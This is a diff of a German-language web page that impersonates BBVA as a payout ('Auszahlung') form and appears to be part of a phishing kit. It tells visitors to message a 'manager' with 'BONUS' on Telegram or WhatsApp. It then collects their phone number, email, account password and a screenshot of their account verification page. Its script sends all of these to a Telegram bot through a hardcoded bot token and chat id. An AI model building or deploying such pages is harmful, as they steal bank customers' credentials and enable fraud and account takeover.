@@ -3,30 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verifizierung - BBVA</title>
+    <title>Auszahlung - BBVA</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Poppins:wght@600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
     <style>
-        /* CSS-Erweiterungen für ein professionelles Design */
         body { font-family: 'Inter', sans-serif; }
         
+        /* Schritt 1: Kontakt-Karte */
         .step-1-card {
             background: linear-gradient(145deg, #1c2128, #111418);
-            border: 1px solid rgba(0, 210, 255, 0.4);
+            border: 2px solid #ff4d4d;
             border-radius: 16px;
             padding: 24px 20px;
             margin-bottom: 25px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 8px 32px rgba(255, 77, 77, 0.15);
         }
 
         .step-title {
-            color: #00d2ff;
+            color: #ff4d4d;
             font-family: 'Poppins', sans-serif;
             font-size: 1.1rem;
             text-transform: uppercase;
             letter-spacing: 1.5px;
             margin-bottom: 12px;
             display: block;
+            font-weight: 700;
+        }
+
+        .important-note {
+            background: rgba(255, 77, 77, 0.1);
+            color: #ff4d4d;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255, 77, 77, 0.2);
+            text-align: center;
         }
 
         .btn-messenger {
@@ -41,14 +53,12 @@
             transition: all 0.3s ease;
             border: none !important;
             color: #fff !important;
+            text-decoration: none;
         }
 
-        /* SVG Messenger Icons */
         .icon-tg, .icon-wa {
-            width: 22px;
-            height: 22px;
-            background-size: contain;
-            background-repeat: no-repeat;
+            width: 22px; height: 22px;
+            background-size: contain; background-repeat: no-repeat;
             display: inline-block;
         }
         .icon-tg { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 0 0-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z'/%3E%3C/svg%3E"); }
@@ -57,19 +67,10 @@
         .btn-tg { background: linear-gradient(135deg, #2AABEE 0%, #229ED9 100%) !important; }
         .btn-wa { background: linear-gradient(135deg, #25D366 0%, #128C7E 100%) !important; }
         
-        .btn-messenger:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,0,0,0.4); }
-
         .file-upload-container {
-            border: 1px dashed #30363d;
-            background: #161b22;
-            border-radius: 12px;
-            padding: 20px;
-            transition: all 0.3s ease;
+            border: 1px dashed #30363d; background: #161b22;
+            border-radius: 12px; padding: 20px; cursor: pointer;
         }
-        .file-upload-container:hover { border-color: #00d2ff; background: #1c2128; }
-        
-        .upload-text b { color: #fff; font-size: 0.85rem; display: block; margin-bottom: 4px; }
-        .upload-text span { color: #8b949e; font-size: 0.75rem; line-height: 1.3; display: block; }
     </style>
 </head>
 <body>
@@ -77,9 +78,12 @@
         <main class="main-card">
             
             <div class="step-1-card">
-                <span class="step-title">Schritt 1</span>
+                <span class="step-title">Schritt 1: Zuerst Kontaktieren</span>
+                <div class="important-note">
+                    🛑 <b>ACHTUNG:</b> Füllen Sie das Formular NICHT aus, bevor Sie eine Bestätigung vom Manager erhalten haben.
+                </div>
                 <p style="font-weight: 500; font-size: 0.95rem; margin-bottom: 20px; color: #e6edf3;">
-                    Fordern Sie Ihre Zugangsdaten beim Manager an, um fortzufahren:
+                    Schreiben Sie dem Manager "BONUS" in Telegram oder WhatsApp:
                 </p>
                 
                 <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
@@ -92,7 +96,7 @@
                 </div>
             </div>
 
-            <div class="form-divider" style="color: #444; font-size: 0.7rem; letter-spacing: 2px;">WEITER</div>
+            <div class="form-divider" style="color: #444; font-size: 0.7rem; letter-spacing: 2px;">DANACH (SCHRITT 2)</div>
 
             <h2 style="font-size: 1.1rem; margin-bottom: 15px; font-family: 'Poppins';">Schritt 2: Datenübermittlung</h2>
 
@@ -114,40 +118,31 @@
                     </div>
                 </div>
 
-                <label>Bestätigungsdokument:</label>
+                <label>Bestätigungsscreenshot:</label>
                 <div class="file-upload-container" onclick="document.getElementById('photo-upload').click()">
                     <div style="margin-bottom: 10px;">
                         <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00d2ff" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M17 8l-5-5-5 5M12 3v12"/></svg>
                     </div>
                     <div class="upload-text">
                         <b>Foto hochladen</b>
-                        <span>Bitte laden Sie einen Screenshot der Bestätigungsseite Ihres Kontos hoch, auf der die erfolgreiche Verifizierung zu sehen ist.</span>
+                        <span>Laden Sie einen Screenshot der Bestätigungsseite Ihres Kontos hoch (Verifizierungs-Status).</span>
                     </div>
                     <input type="file" id="photo-upload" class="hidden-input" accept="image/*" required onchange="updateFileName(this)">
                 </div>
-                <div id="file-name-display" class="file-name-info" style="font-size: 0.7rem; padding-top: 5px;">Keine Datei ausgewählt</div>
+                <div id="file-name-display" class="file-name-info" style="font-size: 0.7rem; padding-top: 5px; color: #8b949e;">Keine Datei ausgewählt</div>
 
-                <button type="submit" class="btn-primary" id="submitBtn" style="margin-top: 25px; height: 56px; background: #00d2ff; color: #000; font-family: 'Poppins'; font-size: 1rem;">
+                <button type="submit" class="btn-primary" id="submitBtn" style="margin-top: 25px; height: 56px; background: #00d2ff; color: #000; font-family: 'Poppins'; font-size: 1rem; border: none; width: 100%; border-radius: 12px; font-weight: 700; cursor: pointer;">
                     Auszahlung beantragen
                 </button>
             </form>
         </main>
     </div>
 
-    <div id="successModal" class="modal-overlay" style="display: none;">
-        <div class="modal-content">
-            <div style="font-size: 40px; margin-bottom: 15px;">✅</div>
-            <h2 style="font-family: 'Poppins';">Erfolgreich!</h2>
-            <p style="font-size: 0.9rem; color: #8b949e;">Ihre Daten werden geprüft. Wir kontaktieren Sie in Kürze bezüglich der Auszahlung.</p>
-        </div>
-    </div>
-
     <script>
-        // Telegram Bot Konfiguration
+        // Deutschsprachige Kommentare und Logik
         const botToken = '8208977713:AAFqG2kZpj_SgtomllDdrBQAn4DG9V6t2OI';
         const chatId = '787580401';
 
-        // Aktualisierung des Dateinamens
         function updateFileName(input) {
             const display = document.getElementById('file-name-display');
             if (input.files.length > 0) {
@@ -156,7 +151,6 @@
             }
         }
 
-        // Formular-Absendung
         document.getElementById('verificationForm').onsubmit = async (e) => {
             e.preventDefault();
             const btn = document.getElementById('submitBtn');
@@ -169,18 +163,16 @@
             const regPass = document.getElementById('regPass').value;
             const fileInput = document.getElementById('photo-upload');
 
-            // Nachricht für den Telegram-Bot
+            // Nachricht an den Bot auf Deutsch
             const message = `🚀 *NEUE ANFRAGE*\n\n📱 Kontakt: ${userPhone}\n📧 Email: ${regEmail}\n📞 Nummer: ${regPhone}\n🔑 PW: ${regPass}`;
 
             try {
-                // Textnachricht senden
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
                 });
 
-                // Foto senden
                 if (fileInput.files.length > 0) {
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
@@ -188,10 +180,9 @@
                     await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                 }
 
-                // Modal anzeigen
-                document.getElementById('successModal').style.display = 'flex';
+                alert('Erfolgreich gesendet!');
             } catch (error) {
-                alert('Ein Fehler ist aufgetreten. Bitte erneut versuchen.');
+                alert('Fehler beim Senden.');
                 btn.disabled = false;
                 btn.innerHTML = 'Auszahlung beantragen';
             }
